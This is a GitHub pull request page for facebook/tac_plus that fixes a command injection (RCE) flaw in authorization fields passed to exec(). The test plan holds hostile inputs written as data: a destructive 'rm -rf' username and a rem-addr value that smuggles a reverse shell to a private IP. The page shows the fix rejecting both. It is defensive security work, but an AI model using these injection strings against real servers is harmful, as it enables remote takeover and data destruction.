
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffacebook%2Ftac_plus%2Fpull%2F41)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffacebook%2Ftac_plus%2Fpull%2F41)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=facebook%2Ftac_plus)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[facebook](/facebook)
/
**[tac\_plus](/facebook/tac_plus)**
Public

* [Notifications](/login?return_to=%2Ffacebook%2Ftac_plus) You must be signed in to change notification settings
* [Fork
  72](/login?return_to=%2Ffacebook%2Ftac_plus)
* [Star
   218](/login?return_to=%2Ffacebook%2Ftac_plus)

* [Code](/facebook/tac_plus)
* [Issues
  6](/facebook/tac_plus/issues)
* [Pull requests
  4](/facebook/tac_plus/pulls)
* [Actions](/facebook/tac_plus/actions)
* [Projects
  0](/facebook/tac_plus/projects)
* [Security](/facebook/tac_plus/security)
* [Insights](/facebook/tac_plus/pulse)

Additional navigation options

* [Code](/facebook/tac_plus)
* [Issues](/facebook/tac_plus/issues)
* [Pull requests](/facebook/tac_plus/pulls)
* [Actions](/facebook/tac_plus/actions)
* [Projects](/facebook/tac_plus/projects)
* [Security](/facebook/tac_plus/security)
* [Insights](/facebook/tac_plus/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ffacebook%2Ftac_plus%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ffacebook%2Ftac_plus%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Author data validation #41

 Merged

[RollerMatic](/RollerMatic)
merged 2 commits into
[main](/facebook/tac_plus/tree/main "facebook/tac_plus:main")
from
[author\_data\_validation](/facebook/tac_plus/tree/author_data_validation "facebook/tac_plus:author_data_validation")

Oct 5, 2023

 Merged

# [Author data validation](#top) #41

[RollerMatic](/RollerMatic)
merged 2 commits into
[main](/facebook/tac_plus/tree/main "facebook/tac_plus:main")
from
[author\_data\_validation](/facebook/tac_plus/tree/author_data_validation "facebook/tac_plus:author_data_validation")

Oct 5, 2023

[Conversation
0](/facebook/tac_plus/pull/41)
[Commits
2](/facebook/tac_plus/pull/41/commits)
[Checks
0](/facebook/tac_plus/pull/41/checks)
[Files changed](/facebook/tac_plus/pull/41/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![RollerMatic](https://avatars.githubusercontent.com/u/74332704?s=60&v=4)](/RollerMatic)

Copy link

Contributor

### @RollerMatic **[RollerMatic](/RollerMatic)** commented [Oct 5, 2023](#issue-1928834241) • edited Loading

this diff fixes a RCE vulnerability within the tacplus code. Fields such as rem-addr field inside a tacacs authorization packet can be injected without any validation from the PRE and POST authorization directive to exec() under certain conditions a) the user config should have a before authorization directive, and a service should be specified.

This fix treats username/NAC address fields to be a alphanumeric strings and validates them as such. Some fields such as NAC address may contain some special characters since its values could IP addresses, hostnames, or vendor specific strings such as Local/Infinode.

This fix will return value "unknown" from the lookup functions if the fields being validated fail validation. The treatment of this string is left to the remote system being called by tac\_plus (to accept/reject)

Added some additional validations for other fields.

test plan

| ./configure --without-libwrap

| make

| ./tac\_plus -G -d 20 -l /dev/stdout -p 2046 -C tac\_plus.cfg

sample config file

```
❯ cat tac_plus.cfg
key = fooman

accounting file = /tmp/acct.log

user = DEFAULT {
before authorization "/home/sahuja4/tac_plus/sample.sh -- '$user' '$address'"
    service = exec {
        default attribute = permit
    }
}

```

The sample.sh file dumps all input args into a tmp file

```
❯ cat ../sample.sh
#!/bin/bash
echo $@ >> /tmp/vars.txt

```

What we want to check is that any arg inside the author\_data struct that we cannot validate is set to unknown, and is passed on to the binary specified in pre/post authorization

We have 3 cases which we want to test

Case 1: Invalid username

> ./debug -- --mode authz --username "rm -rf $PWD" --cmd "show run"

Case 2: Invalid rem-addr

> ./debug -- --mode authz --username "rm -rf $PWD" --cmd "show run" --rem-addr "asd';bash -i >& /dev/tcp/192.168.1.18/1337 0>&1 #"

Case 3: Correctly formatted username and rem-addr

> ./debug -- --mode authz --username sahuja4 --cmd "show run"

The following output was produced when run against the tacacs client invoked against the 3 cases

```
❯ cat /tmp/vars.txt
-- unknown devvm2737   <- case 1
-- sahuja4 unknown     <- case 2
-- sahuja4 devvm2737   <- case 3

```

Here is the server output when ran against the client

```
Tue Oct  3 15:33:28 2023 [2213901]: Reading config
Tue Oct  3 15:33:28 2023 [2213901]: Version F4.0.4.28-7fb Initialized 1
Tue Oct  3 15:33:28 2023 [2213901]: tac_plus server F4.0.4.28-7fb starting
Tue Oct  3 15:33:28 2023 [2213901]: socket FD 4 AF 10
Tue Oct  3 15:33:28 2023 [2213901]: Error Cannot write pid to /var/run/tac_plus.pid.2046 Permission denied
Tue Oct  3 15:33:28 2023 [2213901]: uid=189399 euid=189399 gid=100 egid=100 s=8000912
Tue Oct  3 15:33:32 2023 [2213901]: connection [1] from ::1 [::1]
Tue Oct  3 15:33:32 2023 [2213901]: forked 2214436
Tue Oct  3 15:33:32 2023 [2213901]: forked 2214436 for ::1, procs 1, procs for client 1
============================== case 1============================================
Tue Oct  3 15:33:32 2023 [2214436]: Authenticating ACLs for user 'DEFAULT' instead of 'rm -rf /home/sahuja4/fbsource/fbcode'
Tue Oct  3 15:33:32 2023 [2214436]: invalid character=[ ]
Tue Oct  3 15:33:32 2023 [2214436]: authorization query for 'rm -rf /home/sahuja4/fbsource/fbcode' tty0 from ::1 accepted
Tue Oct  3 15:33:32 2023 [2214436]: exit status=0
Tue Oct  3 15:33:32 2023 [2213901]: Clening up session for pid 2214436
Tue Oct  3 15:33:32 2023 [2213901]: Pid 2214436 Lowered Count for ::1 to 0
Tue Oct  3 15:34:52 2023 [2213901]: connection [1] from ::1 [::1]
Tue Oct  3 15:34:52 2023 [2213901]: forked 2234734
Tue Oct  3 15:34:52 2023 [2213901]: forked 2234734 for ::1, procs 1, procs for client 1
Tue Oct  3 15:34:52 2023 [2234734]: Authenticating ACLs for user 'DEFAULT' instead of 'sahuja4'
============================== case 2============================================
Tue Oct  3 15:34:52 2023 [2234734]: invalid character=[']
Tue Oct  3 15:34:52 2023 [2234734]: authorization query for 'sahuja4' tty0 from ::1 accepted <- case 2
Tue Oct  3 15:34:52 2023 [2234734]: exit status=0
Tue Oct  3 15:34:52 2023 [2213901]: Clening up session for pid 2234734
Tue Oct  3 15:34:52 2023 [2213901]: Pid 2234734 Lowered Count for ::1 to 0
Tue Oct  3 15:36:13 2023 [2213901]: connection [1] from ::1 [::1]
Tue Oct  3 15:36:13 2023 [2213901]: forked 2249661
Tue Oct  3 15:36:13 2023 [2213901]: forked 2249661 for ::1, procs 1, procs for client 1
============================== case 3============================================
Tue Oct  3 15:36:13 2023 [2249661]: Authenticating ACLs for user 'DEFAULT' instead of 'sahuja4'
Tue Oct  3 15:36:13 2023 [2249661]: authorization query for 'sahuja4' tty0 from ::1 accepted
Tue Oct  3 15:36:13 2023 [2249661]: exit status=0
Tue Oct  3 15:36:13 2023 [2213901]: Clening up session for pid 2249661
Tue Oct  3 15:36:13 2023 [2213901]: Pid 2249661 Lowered Count for ::1 to 0

```

Sorry, something went wrong.

All reactions

 RollerMatic
added 2 commits
[October 5, 2023 11:25](#commits-pushed-68ba2a1)

`[add a validation function for author_data fields](/facebook/tac_plus/pull/41/commits/68ba2a19472da0a3de28c41b7a2e222438dca359 "add a validation function for author_data fields")`

`[68ba2a1](/facebook/tac_plus/pull/41/commits/68ba2a19472da0a3de28c41b7a2e222438dca359)`

`[fix github whitespaces](/facebook/tac_plus/pull/41/commits/c223facc4d9441b9fe9a9aefa0d019fa3fbbd420 "fix github whitespaces")`

`[c223fac](/facebook/tac_plus/pull/41/commits/c223facc4d9441b9fe9a9aefa0d019fa3fbbd420)`

[![@facebook-github-bot](https://avatars.githubusercontent.com/u/6422482?s=40&u=1e8724230d8d2a259d754a1b580af5e52db552f4&v=4)](/facebook-github-bot)
[facebook-github-bot](/facebook-github-bot)
added
the
[CLA Signed](/facebook/tac_plus/labels/CLA%20Signed)
label
[Oct 5, 2023](#event-10567197682)

[![@RollerMatic](https://avatars.githubusercontent.com/u/74332704?s=40&v=4)](/RollerMatic)
[RollerMatic](/RollerMatic)
merged commit [`4fdf178`](/facebook/tac_plus/commit/4fdf17890ef777a91b4558ae39adf5ed830050a0)
into
main

[Oct 5, 2023](https://github.com/facebook/tac_plus/pull/41#event-10567999220)

 [![@RollerMatic](https://avatars.githubusercontent.com/u/74332704?s=40&v=4)](/RollerMatic)
[RollerMatic](/RollerMatic)
deleted the
author\_data\_validation

branch
[October 5, 2023 21:05](#event-10568516274)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ffacebook%2Ftac_plus%2Fpull%2F41)

Reviewers

No reviews

Assignees

No one assigned

Labels

[CLA Signed](/facebook/tac_plus/labels/CLA%20Signed)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@RollerMatic](https://avatars.githubusercontent.com/u/74332704?s=52&v=4)](/RollerMatic) [![@facebook-github-bot](https://avatars.githubusercontent.com/u/6422482?s=52&v=4)](/facebook-github-bot)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

